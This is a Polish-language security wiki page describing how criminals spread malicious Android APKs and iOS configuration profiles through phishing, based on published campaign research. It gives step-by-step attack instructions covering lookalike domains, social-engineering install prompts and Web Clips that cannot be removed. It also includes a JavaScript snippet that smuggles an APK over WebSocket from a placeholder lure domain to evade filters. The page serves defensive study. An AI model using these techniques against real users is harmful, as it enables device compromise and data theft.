# Mobile Phishing i dystrybucja złośliwych aplikacji (Android i iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona opisuje techniki wykorzystywane przez cyberprzestępców do dystrybucji **złośliwych plików APK na Androida** oraz **profili konfiguracji mobilnej na iOS** za pomocą phishingu (SEO, social engineeringu, fałszywych sklepów, aplikacji randkowych itp.).
> Materiał opracowano na podstawie kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.<sup>[[1]](#references)</sup>

## Przebieg ataku

1. **Infrastruktura SEO/phishingowa**
   * Zarejestruj dziesiątki podobnie wyglądających domen (randki, udostępnianie plików w chmurze, serwis samochodowy…).
     – Używaj lokalnych słów kluczowych i emoji w elemencie `<title>`, aby uzyskać wysoką pozycję w Google.
     – Umieść na tej samej stronie docelowej instrukcje instalacji zarówno dla Androida (`.apk`), jak i iOS.
2. **Pobranie pierwszego etapu**
   * Android: bezpośredni link do niepodpisanego pliku APK lub APK z „zewnętrznego sklepu”.
   * iOS: link `itms-services://` lub zwykły link HTTPS do złośliwego profilu **mobileconfig** (zob. poniżej).
3. **Działanie po instalacji na Androidzie**
   * Uruchamianie zależne od C2, nadużywanie uprawnień, obejścia droppera, zbieranie danych w tle i inne zachowania malware po instalacji opisano na poświęconej temu stronie Android Malware Post-Exploitation poniżej.
4. **Technika dostarczania na iOS**
   * Pojedynczy **profil konfiguracji mobilnej** może zażądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itp., aby objąć urządzenie nadzorem podobnym do „MDM”.
   * Instrukcje wykorzystujące social engineering:
     1. Otwórz Ustawienia ➜ *Pobrano profil*.
     2. Trzykrotnie stuknij *Instaluj* (zrzuty ekranu na stronie phishingowej).
     3. Zaufaj niepodpisanemu profilowi ➜ atakujący uzyskuje uprawnienia do *Kontaktów* i *Zdjęć* bez weryfikacji App Store.
5. **Ładunek Web Clip na iOS (ikona aplikacji phishingowej)**
   * Ładunki `com.apple.webClip.managed` mogą **przypiąć adres URL phishingowy do ekranu początkowego** z markową ikoną i etykietą.
   * Web Clips mogą działać **na pełnym ekranie** (ukrywa to interfejs przeglądarki) i być oznaczone jako **niemożliwe do usunięcia**, co zmusza ofiarę do usunięcia profilu, aby pozbyć się ikony.<sup>[[3]](#references)</sup>
6. **Warstwa sieciowa**
   * Zwykły HTTP, często na porcie 80, z nagłówkiem HOST w rodzaju `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwo wykryć).

## Android Malware Post-Exploitation

Informacje o technikach malware na Androida po instalacji, takich jak C2, nadużywanie Accessibility, nakładki, automatyzacja ATS, etapowe ładowanie DEX, płatne SMS-y i utrzymywanie dostępu, znajdziesz na stronie:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Przemycanie APK przez Socket.IO/WebSocket + fałszywe strony Google Play

Atakujący coraz częściej zastępują statyczne linki do plików APK kanałem Socket.IO/WebSocket osadzonym w przynętach wyglądających jak Google Play. Ukrywa to URL ładunku, omija filtry adresów URL i rozszerzeń oraz zapewnia realistyczny proces instalacji.<sup>[[2]](#references)[[4]](#references)</sup>

Typowy przepływ po stronie klienta zaobserwowany w rzeczywistych atakach:

<details>
<summary>Fałszywy downloader Play wykorzystujący Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Dlaczego omija proste zabezpieczenia:
- Nie udostępnia statycznego adresu URL APK; payload jest odtwarzany w pamięci z ramek WebSocket.
- Filtry URL/MIME/rozszerzeń blokujące bezpośrednie odpowiedzi .apk mogą nie wykryć danych binarnych przesyłanych przez WebSockets/Socket.IO.
- Crawlerzy i sandboxy URL, które nie obsługują WebSockets, nie pobiorą payloadu.

Zobacz też: WebSocket tradecraft i narzędzia:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Ciemna strona romansu: kampania wymuszeń SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Ustawienia payloadu Web Clips dla urządzeń Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Trojan bankowy atakujący użytkowników Androida z Indonezji i Wietnamu](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
